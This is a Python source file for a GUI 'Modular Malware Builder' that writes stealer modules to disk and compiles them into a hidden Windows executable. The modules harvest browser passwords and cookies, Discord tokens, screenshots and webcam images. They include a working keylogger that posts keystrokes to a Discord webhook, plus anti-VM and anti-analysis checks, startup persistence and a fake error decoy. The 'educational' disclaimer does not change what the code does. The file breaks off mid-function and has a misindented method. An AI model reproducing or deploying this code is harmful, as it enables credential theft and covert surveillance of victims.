# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================


from Plugins.Utils import *
from Plugins.Config import *

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog, scrolledtext
    import os
    import json
    import threading
    import time
    from datetime import datetime
    import subprocess
    import sys
    import tempfile
    import shutil
    import requests
    import importlib.util
    import inspect
except Exception as e:
    MissingModule(e)

class ModularMalwareBuilder:
    def __init__(self):
        self.root = tk.Tk()
        self.modules_dir = os.path.join(tool_path, "virus-builder-tool", "modules")
        self.configs_dir = os.path.join(tool_path, "virus-builder-tool", "configs")
        
        # Create directories if they don't exist
        os.makedirs(self.modules_dir, exist_ok=True)
        os.makedirs(self.configs_dir, exist_ok=True)
        
        # Generate module files if they don't exist
        self.generate_module_files()
        
        self.setup_window()
        self.setup_variables()
        self.setup_ui()
        
    def generate_module_files(self):
        """Generate module files if they don't exist"""
        modules = {
            "system_info.py": """
def collect_system_info():
    \"\"\"Collect system information\"\"\"
    import platform
    import socket
    import getpass
    from datetime import datetime
    
    info = {
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "processor": platform.processor(),
        "architecture": platform.architecture()[0],
        "ip": socket.gethostbyname(socket.gethostname()),
        "timestamp": datetime.now().isoformat()
    }
    return info
""",
            "passwords.py": """
def steal_passwords():
    \"\"\"Steal browser passwords\"\"\"
    import os
    import json
    import sqlite3
    import base64
    from Crypto.Cipher import AES
    import win32crypt
    
    results = []
    
    # Common browser password locations
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
    }
    
    for browser, db_path in browsers.items():
        if os.path.exists(db_path):
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    # Decryption logic here
                    results.append({
                        "browser": browser,
                        "url": url,
                        "username": username,
                        "password": "[ENCRYPTED]"
                    })
                
                conn.close()
            except:
                pass
    
    return results
""",
            "cookies.py": """
def steal_cookies():
    \"\"\"Steal browser cookies\"\"\"
    import os
    import sqlite3
    import json
    
    cookies = []
    
    # Chrome cookies
    chrome_cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Cookies")
    
    if os.path.exists(chrome_cookies_path):
        try:
            conn = sqlite3.connect(chrome_cookies_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, path FROM cookies")
            
            for row in cursor.fetchall():
                host, name, value, path = row
                cookies.append({
                    "host": host,
                    "name": name,
                    "value": value[:50] + "..." if len(value) > 50 else value,
                    "path": path
                })
            
            conn.close()
        except:
            pass
    
    return cookies
""",
            "discord_tokens.py": """
def steal_discord_tokens():
    \"\"\"Steal Discord tokens\"\"\"
    import os
    import json
    import base64
    import win32crypt
    
    tokens = []
    
    # Discord token paths
    discord_paths = [
        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb")
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            # Search for tokens in .ldb files
            for file in os.listdir(path):
                if file.endswith('.ldb'):
                    try:
                        with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for tokens (simplified)
                            if 'token' in content.lower():
                                tokens.append({
                                    "source": file,
                                    "found": True
                                })
                    except:
                        pass
    
    return tokens
""",
            "screenshot.py": """
def take_screenshot():
    \"\"\"Take screenshot\"\"\"
    import io
    import base64
    from PIL import ImageGrab
    
    try:
        # Take screenshot
        screenshot = ImageGrab.grab()
        
        # Convert to base64
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        
        return {
            "success": True,
            "image_base64": img_str[:100] + "..." if len(img_str) > 100 else img_str,
            "size": f"{screenshot.size[0]}x{screenshot.size[1]}"
        }
    except Exception as e:
        return {"success": False, "error": str(e)}
""",
            "keylogger.py": """
import keyboard
import requests
import threading
import time
import mss
import mss.tools
import io
import json
import base64

def start_keylogger(webhook_url):
    \"\"\"Start keylogger with screenshot capture\"\"\"
    
    logs = ""
    lock = threading.Lock()
    screenshot_count = 0
    running = True
    
    def capture_all_screens():
        \"\"\"Capture all monitors\"\"\"
        try:
            with mss.mss() as sct:
                monitors = sct.monitors
                screenshots = []
                
                for i, monitor in enumerate(monitors[1:]):  # Skip monitor 0 (all monitors combined)
                    screenshot = sct.grab(monitor)
                    img = mss.tools.to_png(screenshot.rgb, screenshot.size)
                    
                    # Convert to base64 for easier transmission
                    img_base64 = base64.b64encode(img).decode('utf-8')
                    screenshots.append({
                        "monitor": i + 1,
                        "image_base64": img_base64[:100] + "..." if len(img_base64) > 100 else img_base64,
                        "resolution": f"{screenshot.width}x{screenshot.height}"
                    })
                
                return screenshots
        except Exception as e:
            return {"error": str(e)}
    
    def send_to_discord():
        \"\"\"Send logs and screenshots to Discord\"\"\"
        nonlocal logs, screenshot_count, running
        
        while running:
            time.sleep(30)  # Send every 30 seconds
            
            with lock:
                # Prepare data to send
                data_to_send = {}
                
                # Add logs if any
                if logs:
                    data_to_send["keylogs"] = logs
                    logs = ""  # Clear logs after sending
                
                # Capture screenshots
                try:
                    screenshots = capture_all_screens()
                    if screenshots:
                        data_to_send["screenshots"] = screenshots
                        screenshot_count += len(screenshots)
                except Exception as e:
                    data_to_send["screenshot_error"] = str(e)
                
                # Send to Discord if there's data
                if data_to_send:
                    try:
                        # Format as embed for better Discord display
                        embed = {
                            "title": "🔑 Keylogger Report",
                            "color": 16711680,  # Red
                            "fields": [],
                            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
                        }
                        
                        if "keylogs" in data_to_send:
                            logs_text = data_to_send["keylogs"]
                            if len(logs_text) > 1000:
                                logs_text = logs_text[:1000] + "..."
                            
                            embed["fields"].append({
                                "name": "Keystrokes",
                                "value": f"```\\n{logs_text}\\n```",
                                "inline": False
                            })
                        
                        if "screenshots" in data_to_send:
                            screenshot_info = []
                            for i, screenshot in enumerate(data_to_send["screenshots"]):
                                if "resolution" in screenshot:
                                    screenshot_info.append(f"Monitor {screenshot['monitor']}: {screenshot['resolution']}")
                            
                            if screenshot_info:
                                embed["fields"].append({
                                    "name": "📸 Screenshots",
                                    "value": "\\\\n".join(screenshot_info),
                                    "inline": True
                                })
                        
                        payload = {
                            "embeds": [embed],
                            "username": "Keylogger Agent"
                        }
                        
                        response = requests.post(webhook_url, json=payload, timeout=10)
                        return response.status_code in [200, 204]
                        
                    except Exception as e:
                        print(f"[-] Failed to send to Discord: {e}")
                        return False
        
        return True
    
    def on_press(event):
        \"\"\"Handle key press events\"\"\"
        nonlocal logs
        
        with lock:
            try:
                if event.name:
                    if len(event.name) == 1:
                        logs += event.name
                    elif event.name == "space":
                        logs += " "
                    elif event.name == "enter":
                        logs += "\\\\n"
                    elif event.name == "backspace":
                        if len(logs) > 0:
                            logs = logs[:-1]
                    elif event.name == "tab":
                        logs += "\\\\t"
                    else:
                        logs += f"[{event.name.upper()}]"
            except:
                logs += "[UNKNOWN]"
    
    def stop_keylogger():
        \"\"\"Stop the keylogger\"\"\"
        nonlocal running
        running = False
        keyboard.unhook_all()
    
    # Start keylogger thread
    try:
        # Hook keyboard events
        keyboard.on_press(on_press)
        
        # Start Discord sending thread
        send_thread = threading.Thread(target=send_to_discord, daemon=True)
        send_thread.start()
        
        return {
            "success": True,
            "thread_alive": send_thread.is_alive(),
            "start_time": time.time(),
            "stop_function": stop_keylogger
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

# Alternative simpler version without screenshots
def start_simple_keylogger(webhook_url):
    \"\"\"Simple keylogger without screenshots (for when mss is not available)\"\"\"
    
    logs = ""
    lock = threading.Lock()
    running = True
    
    def send_logs():
        nonlocal logs, running
        
        while running:
            time.sleep(60)  # Send every 60 seconds
            
            with lock:
                if logs:
                    try:
                        # Truncate if too long
                        logs_to_send = logs
                        if len(logs_to_send) > 1500:
                            logs_to_send = logs_to_send[:1500] + "..."
                        
                        embed = {
                            "title": "🔑 Simple Keylogger",
                            "description": f"```\\n{logs_to_send}\\n```",
                            "color": 16711680,
                            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
                        }
                        
                        payload = {
                            "embeds": [embed],
                            "username": "Simple Keylogger"
                        }
                        
                        response = requests.post(webhook_url, json=payload, timeout=10)
                        
                        if response.status_code in [200, 204]:
                            logs = ""  # Clear logs after successful send
                            
                    except Exception as e:
                        print(f"[-] Failed to send logs: {e}")
    
    def on_press(event):
        nonlocal logs
        
        with lock:
            try:
                if event.name:
                    if event.name == "space":
                        logs += " "
                    elif event.name == "enter":
                        logs += "\\\\n"
                    elif event.name == "backspace":
                        if logs:
                            logs = logs[:-1]
                    elif len(event.name) == 1:
                        logs += event.name
                    else:
                        logs += f"[{event.name.upper()}]"
            except:
                pass
    
    def stop():
        nonlocal running
        running = False
        keyboard.unhook_all()
    
    try:
        keyboard.on_press(on_press)
        thread = threading.Thread(target=send_logs, daemon=True)
        thread.start()
        
        return {
            "success": True,
            "version": "simple",
            "stop_function": stop
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

# Detection prevention
def is_keylogger_safe():
    \"\"\"Check if it's safe to run keylogger (Anti-VM, Anti-sandbox checks)\"\"\"
    import platform
    import subprocess
    
    # Check for common analysis tools
    analysis_tools = [
        "wireshark", "procmon", "processhacker", "hijackthis",
        "ollydbg", "ida", "x64dbg", "immunity", "cheatengine"
    ]
    
    try:
        # Check running processes
        if platform.system() == "Windows":
            output = subprocess.check_output("tasklist", shell=True).decode().lower()
            
            for tool in analysis_tools:
                if tool in output:
                    return False
    except:
        pass
    
    return True
""",
            "webcam.py": """
def capture_webcam():
    \"\"\"Capture webcam image\"\"\"
    import cv2
    import base64
    import io
    from PIL import Image
    
    try:
        # Access webcam
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        
        if ret:
            # Convert to PIL Image
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            
            # Convert to base64
            buffered = io.BytesIO()
            img.save(buffered, format="JPEG")
            img_str = base64.b64encode(buffered.getvalue()).decode()
            
            cam.release()
            
            return {
                "success": True,
                "image_base64": img_str[:100] + "..." if len(img_str) > 100 else img_str,
                "resolution": f"{frame.shape[1]}x{frame.shape[0]}"
            }
        else:
            cam.release()
            return {"success": False, "error": "Could not capture image"}
    except Exception as e:
        return {"success": False, "error": str(e)}
"""
        }
        
        # Create module files
        for filename, code in modules.items():
            filepath = os.path.join(self.modules_dir, filename)
            if not os.path.exists(filepath):
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(code)
        
        # Create config files
        configs = {
            "anti_vm.py": """
def check_vm():
    \"\"\"Check if running in virtual machine\"\"\"
    import platform
    import subprocess
    
    vm_indicators = [
        "vmware", "virtualbox", "qemu", "xen", "vbox", "hyper-v",
        "vmx", "vmic", "hv", "virtual", "innotek", "parallels"
    ]
    
    # Check system info
    system_info = str(platform.uname()).lower()
    
    # Check processes
    try:
        processes = subprocess.check_output("tasklist", shell=True).decode().lower()
    except:
        processes = ""
    
    # Check services
    try:
        services = subprocess.check_output("sc query", shell=True).decode().lower()
    except:
        services = ""
    
    # Combine all checks
    all_checks = system_info + processes + services
    
    for indicator in vm_indicators:
        if indicator in all_checks:
            return True
    
    return False
""",
            "startup.py": """
def add_to_startup():
    \"\"\"Add to Windows startup\"\"\"
    import os
    import shutil
    import sys
    
    try:
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
            os.path.basename(sys.executable)
        )
        
        # Copy itself to startup
        shutil.copy(sys.executable, startup_path)
        return True
    except:
        return False
""",
            "fake_error.py": """
def show_fake_error():
    \"\"\"Show fake error message\"\"\"
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(
            0,
            "This application requires .NET Framework 4.8.\\nPlease install it and try again.",
            "Runtime Error",
            0x10
        )
        return True
    except:
        return False
""",
            "obfuscation.py": """
def obfuscate_strings():
    \"\"\"Simple string obfuscation\"\"\"
    # This would contain obfuscation logic
    pass

def deobfuscate_strings():
    \"\"\"Deobfuscate strings\"\"\"
    pass
"""
        }
        
        for filename, code in configs.items():
            filepath = os.path.join(self.configs_dir, filename)
            if not os.path.exists(filepath):
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(code)
    
    def setup_window(self):
        """Configure main window"""
        self.root.title(f"{name_tool} • Modular Malware Builder")
        self.root.geometry("1000x750")
        self.root.configure(bg="#0a0a0a")
        
        # Center window
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
        
        # Make window not resizable
        self.root.resizable(False, False)
        
    def setup_variables(self):
        """Initialize variables"""
        self.webhook_var = tk.StringVar()
        self.filename_var = tk.StringVar(value="output.exe")
        
        # Available modules (from files)
        self.available_modules = self.get_available_modules()
        
        # Initialize checkboxes
        self.module_vars = {}
        for module in self.available_modules:
            self.module_vars[module] = tk.BooleanVar(value=module in ["system_info", "passwords", "cookies"])
        
        # Options
        self.options = {
            "Anti-VM": tk.BooleanVar(value=True),
            "Anti-Debug": tk.BooleanVar(value=True),
            "Startup": tk.BooleanVar(value=True),
            "Obfuscation": tk.BooleanVar(value=True),
            "Fake Error": tk.BooleanVar(value=True),
            "Self-Destruct": tk.BooleanVar(),
            "Encryption": tk.BooleanVar(value=True),
        }
        
    def get_available_modules(self):
        """Get list of available modules from files"""
        modules = []
        if os.path.exists(self.modules_dir):
            for file in os.listdir(self.modules_dir):
                if file.endswith('.py'):
                    modules.append(file[:-3])  # Remove .py extension
        return sorted(modules)
    
    def setup_ui(self):
        """Setup modern UI"""
        # Main container
        main_frame = tk.Frame(self.root, bg="#0a0a0a")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Header
        header_frame = tk.Frame(main_frame, bg="#0a0a0a")
        header_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(
            header_frame,
            text="🧩 MODULAR MALWARE BUILDER",
            font=("Segoe UI", 24, "bold"),
            fg="#ff4444",
            bg="#0a0a0a"
        ).pack(side=tk.LEFT)
        
        tk.Label(
            header_frame,
            text=f"v1.0 • {len(self.available_modules)} modules",
            font=("Segoe UI", 12),
            fg="#666666",
            bg="#0a0a0a"
        ).pack(side=tk.LEFT, padx=(10, 0), pady=8)
        
        # Webhook Section
        webhook_frame = tk.Frame(main_frame, bg="#0a0a0a")
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(
            webhook_frame,
            text="Discord Webhook:",
            font=("Segoe UI", 11),
            fg="#ffffff",
            bg="#0a0a0a"
        ).pack(anchor=tk.W)
        
        # Webhook input with button
        input_frame = tk.Frame(webhook_frame, bg="#0a0a0a")
        input_frame.pack(fill=tk.X, pady=(5, 0))
        
        self.webhook_entry = tk.Entry(
            input_frame,
            textvariable=self.webhook_var,
            font=("Segoe UI", 10),
            bg="#1a1a1a",
            fg="#ffffff",
            insertbackground="#ffffff",
            relief=tk.FLAT,
            width=50
        )
        self.webhook_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        tk.Button(
            input_frame,
            text="Verify",
            command=self.verify_webhook,
            font=("Segoe UI", 9, "bold"),
            bg="#ff4444",
            fg="white",
            activebackground="#ff6666",
            activeforeground="white",
            relief=tk.FLAT,
            cursor="hand2",
            width=8
        ).pack(side=tk.LEFT)
        
        # Configuration Sections
        config_frame = tk.Frame(main_frame, bg="#0a0a0a")
        config_frame.pack(fill=tk.BOTH, expand=True)
        
        # Left panel - Modules
        left_panel = tk.Frame(config_frame, bg="#0a0a0a")
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        tk.Label(
            left_panel,
            text="Stealer Modules",
            font=("Segoe UI", 12, "bold"),
            fg="#ffffff",
            bg="#0a0a0a"
        ).pack(anchor=tk.W, pady=(0, 10))
        
        # Scrollable modules frame
        modules_container = tk.Frame(left_panel, bg="#0a0a0a")
        modules_container.pack(fill=tk.BOTH, expand=True)
        
        # Create canvas with scrollbar
        canvas = tk.Canvas(modules_container, bg="#0a0a0a", highlightthickness=0)
        scrollbar = ttk.Scrollbar(modules_container, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg="#0a0a0a")
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        # Modules in 2 columns
        modules_frame = tk.Frame(scrollable_frame, bg="#0a0a0a")
        modules_frame.pack(fill=tk.BOTH, expand=True, padx=5)
        
        left_col = tk.Frame(modules_frame, bg="#0a0a0a")
        left_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_col = tk.Frame(modules_frame, bg="#0a0a0a")
        right_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0))
        
        # Add module checkboxes
        modules_list = list(self.module_vars.items())
        mid = len(modules_list) // 2
        
        for i, (module_name, var) in enumerate(modules_list[:mid]):
            self.create_module_checkbox(left_col, module_name, var)
        
        for i, (module_name, var) in enumerate(modules_list[mid:]):
            self.create_module_checkbox(right_col, module_name, var)
        
        # Pack canvas and scrollbar
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Right panel - Options & Build
        right_panel = tk.Frame(config_frame, bg="#0a0a0a", width=300)
        right_panel.pack(side=tk.RIGHT, fill=tk.Y)
        right_panel.pack_propagate(False)
        
        tk.Label(
            right_panel,
            text="Build Options",
            font=("Segoe UI", 12, "bold"),
            fg="#ffffff",
            bg="#0a0a0a"
        ).pack(anchor=tk.W, pady=(0, 10))
        
        # Options checkboxes
        options_frame = tk.Frame(right_panel, bg="#0a0a0a")
        options_frame.pack(fill=tk.X, pady=(0, 20))
        
        for name, var in self.options.items():
            self.create_checkbox(options_frame, name, var)
        
        # Filename
        tk.Label(
            right_panel,
            text="Output Filename:",
            font=("Segoe UI", 11),
            fg="#ffffff",
            bg="#0a0a0a"
        ).pack(anchor=tk.W, pady=(0, 5))
        
        tk.Entry(
            right_panel,
            textvariable=self.filename_var,
            font=("Segoe UI", 10),
            bg="#1a1a1a",
            fg="#ffffff",
            insertbackground="#ffffff",
            relief=tk.FLAT
        ).pack(fill=tk.X, pady=(0, 20))
        
        # Build button
        self.build_btn = tk.Button(
            right_panel,
            text="🧩 BUILD MODULAR",
            command=self.build_malware,
            font=("Segoe UI", 14, "bold"),
            bg="#ff4444",
            fg="white",
            activebackground="#ff6666",
            activeforeground="white",
            relief=tk.FLAT,
            cursor="hand2",
            height=2
        )
        self.build_btn.pack(fill=tk.X, pady=(10, 0))
        
        # Progress bar
        self.progress = ttk.Progressbar(
            right_panel,
            mode='indeterminate',
            length=280
        )
        self.progress.pack(fill=tk.X, pady=(10, 0))
        
        # Status label
        self.status_label = tk.Label(
            right_panel,
            text=f"Ready • {len(self.available_modules)} modules available",
            font=("Segoe UI", 9),
            fg="#666666",
            bg="#0a0a0a"
        )
        self.status_label.pack(anchor=tk.W, pady=(5, 0))
        
        # Log output
        log_frame = tk.Frame(main_frame, bg="#0a0a0a")
        log_frame.pack(fill=tk.X, pady=(20, 0))
        
        tk.Label(
            log_frame,
            text="Build Log:",
            font=("Segoe UI", 11, "bold"),
            fg="#ffffff",
            bg="#0a0a0a"
        ).pack(anchor=tk.W, pady=(0, 5))
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=8,
            font=("Consolas", 9),
            bg="#1a1a1a",
            fg="#00ff00",
            insertbackground="#00ff00",
            relief=tk.FLAT
        )
        self.log_text.pack(fill=tk.X)
        
    def create_module_checkbox(self, parent, module_name, variable):
        """Create checkbox for module with preview"""
        frame = tk.Frame(parent, bg="#0a0a0a")
        frame.pack(fill=tk.X, pady=2)
        
        # Check if module file exists
        module_path = os.path.join(self.modules_dir, f"{module_name}.py")
        exists = os.path.exists(module_path)
        
        cb = tk.Checkbutton(
            frame,
            text=f"{module_name.replace('_', ' ').title()} {'✅' if exists else '❌'}",
            variable=variable,
            font=("Segoe UI", 10),
            bg="#0a0a0a",
            fg="#00ff00" if exists else "#ff4444",
            activebackground="#0a0a0a",
            activeforeground="#00ff00" if exists else "#ff4444",
            selectcolor="#0a0a0a",
            cursor="hand2",
            anchor="w"
        )
        cb.pack(fill=tk.X)
        
        # Add preview button
        if exists:
            preview_btn = tk.Button(
                frame,
                text="👁",
                command=lambda m=module_name: self.preview_module(m),
                font=("Segoe UI", 8),
                bg="#2a2a2a",
                fg="#ffffff",
                relief=tk.FLAT,
                cursor="hand2",
                width=3
            )
            preview_btn.pack(side=tk.RIGHT)
    
    def create_checkbox(self, parent, text, variable):
        """Create modern checkbox"""
        frame = tk.Frame(parent, bg="#0a0a0a")
        frame.pack(fill=tk.X, pady=2)
        
        cb = tk.Checkbutton(
            frame,
            text=text,
            variable=variable,
            font=("Segoe UI", 10),
            bg="#0a0a0a",
            fg="#ffffff",
            activebackground="#0a0a0a",
            activeforeground="#ffffff",
            selectcolor="#0a0a0a",
            cursor="hand2",
            anchor="w"
        )
        cb.pack(fill=tk.X)
    
    def preview_module(self, module_name):
        """Preview module code"""
        module_path = os.path.join(self.modules_dir, f"{module_name}.py")
        
        if os.path.exists(module_path):
            with open(module_path, 'r', encoding='utf-8') as f:
                code = f.read()
            
            # Show preview window
            preview_window = tk.Toplevel(self.root)
            preview_window.title(f"Module Preview: {module_name}")
            preview_window.geometry("600x400")
            preview_window.configure(bg="#0a0a0a")
            
            tk.Label(
                preview_window,
                text=f"📁 {module_name}.py",
                font=("Segoe UI", 12, "bold"),
                fg="#ff4444",
                bg="#0a0a0a"
            ).pack(anchor=tk.W, padx=10, pady=(10, 5))
            
            text_widget = scrolledtext.ScrolledText(
                preview_window,
                font=("Consolas", 9),
                bg="#1a1a1a",
                fg="#00ff00",
                insertbackground="#00ff00",
                relief=tk.FLAT
            )
            text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
            text_widget.insert(1.0, code)
            text_widget.config(state=tk.DISABLED)
    
    def load_module_code(self, module_name):
        """Load code from module file"""
        module_path = os.path.join(self.modules_dir, f"{module_name}.py")
        
        if os.path.exists(module_path):
            with open(module_path, 'r', encoding='utf-8') as f:
                return f.read()
        return f"# Module {module_name} not found\n"
    
    def load_config_code(self, config_name):
        """Load code from config file"""
        config_path = os.path.join(self.configs_dir, f"{config_name.lower().replace('-', '_')}.py")
        
        if os.path.exists(config_path):
            with open(config_path, 'r', encoding='utf-8') as f:
                return f.read()
        return f"# Config {config_name} not found\n"
    
    def verify_webhook(self):
        """Verify Discord webhook"""
        webhook = self.webhook_var.get().strip()
        
        if not webhook:
            self.log("❌ Please enter a webhook URL", "error")
            return
        
        # Accept both discord.com and discordapp.com
        if not ("discord.com/api/webhooks/" in webhook or "discordapp.com/api/webhooks/" in webhook):
            self.log("❌ Invalid Discord webhook", "error")
            self.log("✅ Must contain: discord.com/api/webhooks/ or discordapp.com/api/webhooks/", "info")
            return
        
        self.log("🔗 Testing webhook connection...", "info")
        
        def test_webhook_thread():
            try:
                test_data = {
                    "content": "✅ Webhook test successful from Modular Builder",
                    "username": f"{name_tool} Tester"
                }
                
                response = requests.post(webhook, json=test_data, timeout=10)
                
                if response.status_code in [200, 204]:
                    self.log("✅ Webhook verified successfully!", "success")
                else:
                    self.log(f"❌ Webhook test failed (HTTP {response.status_code})", "error")
                    
            except Exception as e:
                self.log(f"❌ Error: {str(e)[:50]}", "error")
        
        thread = threading.Thread(target=test_webhook_thread)
        thread.daemon = True
        thread.start()
    
    def log(self, message, msg_type="info"):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.status_label.config(text=message.replace("✅", "").replace("❌", "").strip())
    
    def build_malware(self):
        """Build modular malware"""
        webhook = self.webhook_var.get().strip()
        
        if not webhook:
            self.log("❌ Webhook URL is required!", "error")
            return
        
        # Get selected modules
        selected_modules = [name for name, var in self.module_vars.items() if var.get()]
        selected_options = [name for name, var in self.options.items() if var.get()]
        
        if not selected_modules:
            self.log("❌ Select at least one module!", "error")
            return
        
        # Ask for output location
        filename = self.filename_var.get()
        if not filename.endswith('.exe'):
            filename += '.exe'
        
        output_file = filedialog.asksaveasfilename(
            title="Save Modular Malware",
            defaultextension=".exe",
            initialfile=filename,
            filetypes=[("Executable", "*.exe"), ("All files", "*.*")]
        )
        
        if not output_file:
            return
        
        # Disable build button
        self.build_btn.config(state=tk.DISABLED, text="🧩 BUILDING...")
        self.progress.start()
        
        # Start build in thread
        thread = threading.Thread(
            target=self._build_modular_thread,
            args=(output_file, selected_modules, selected_options, webhook)
        )
        thread.daemon = True
        thread.start()
    
    def _build_modular_thread(self, output_file, modules, options, webhook):
        """Build modular malware thread"""
        try:
            self.log("🚀 Starting modular build...", "info")
            self.log(f"📦 Selected modules: {len(modules)}", "info")
            self.log(f"⚙️ Selected options: {len(options)}", "info")
            
            # Create temp directory
            temp_dir = tempfile.mkdtemp()
            self.log(f"📁 Temp directory: {temp_dir}", "info")
            
            # Generate main script by combining modules
            main_script = self._generate_modular_script(modules, options, webhook)
            script_path = os.path.join(temp_dir, "malware.py")
            
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(main_script)
            
            self.log("✅ Modular script generated", "success")
            
            # Compile with PyInstaller
            self.log("⚙️ Compiling with PyInstaller...", "info")
            
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--distpath", os.path.dirname(output_file),
                "--workpath", os.path.join(temp_dir, "build"),
                "--specpath", os.path.join(temp_dir, "spec"),
                "--name", os.path.splitext(os.path.basename(output_file))[0],
                "--hidden-import", "requests",
                "--hidden-import", "json",
                script_path
            ]
            
            # Add hidden imports based on modules
            if "screenshot" in modules:
                cmd.extend(["--hidden-import", "PIL"])
            if "webcam" in modules:
                cmd.extend(["--hidden-import", "cv2", "--hidden-import", "PIL"])
            if "keylogger" in modules:
                cmd.extend(["--hidden-import", "keyboard", "--hidden-import", "mss", "--hidden-import", "PIL"])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=temp_dir
            )
            
            if result.returncode == 0 and os.path.exists(output_file):
                file_size = os.path.getsize(output_file) / 1024
                
                self.log(f"✅ Build successful!", "success")
                self.log(f"📦 Output: {output_file}", "info")
                self.log(f"📊 Size: {file_size:.1f} KB", "info")
                self.log(f"🧩 Modules included: {', '.join(modules)}", "info")
                
                # Save build info
                self._save_build_info(output_file, modules, options)
                
                self.root.after(0, lambda: messagebox.showinfo(
                    "Build Complete",
                    f"✅ Modular malware built!\n\n"
                    f"File: {os.path.basename(output_file)}\n"
                    f"Size: {file_size:.1f} KB\n"
                    f"Modules: {len(modules)}\n"
                    f"Options: {len(options)}\n\n"
                    f"⚠️ Educational purposes only!"
                ))
            else:
                self.log(f"❌ Build failed: {result.stderr[:200]}", "error")
            
            # Cleanup
            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass
            
        except Exception as e:
            self.log(f"❌ Build error: {str(e)}", "error")
        
        finally:
            self.root.after(0, self._build_complete)
    
        def _generate_modular_script(self, modules, options, webhook):
        """Generate main script by combining modules - FIXED VERSION"""
        script = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Modular Malware - Generated by {} Builder
# Educational purposes only

import os
import sys
import json
import requests
import platform
import socket
import getpass
import time
import threading
from datetime import datetime

# Configuration
CONFIG = {{
    "webhook": "{}",
    "modules": {},
    "options": {},
    "build_date": "{}"
}}

""".format(name_tool, webhook, json.dumps(modules), json.dumps(options), datetime.now().isoformat())
        
        # Add module-specific imports
        script += "# Module-specific imports\n"
        imports_map = {
            "keylogger": ["import keyboard", "import mss", "import mss.tools", "import io", "import base64"],
            "screenshot": ["import mss", "import mss.tools", "import io", "import base64", "from PIL import ImageGrab"],
            "webcam": ["import cv2", "import base64", "import io", "from PIL import Image"],
            "passwords": ["import sqlite3", "import base64", "from Crypto.Cipher import AES"],
            "discord_tokens": ["import sqlite3", "import base64"],
            "wifi_passwords": ["import subprocess", "import re"],
        }
        
        all_imports = set()
        for module in modules:
            if module in imports_map:
                for imp in imports_map[module]:
                    all_imports.add(imp)
        
        # Add basic imports that might be needed
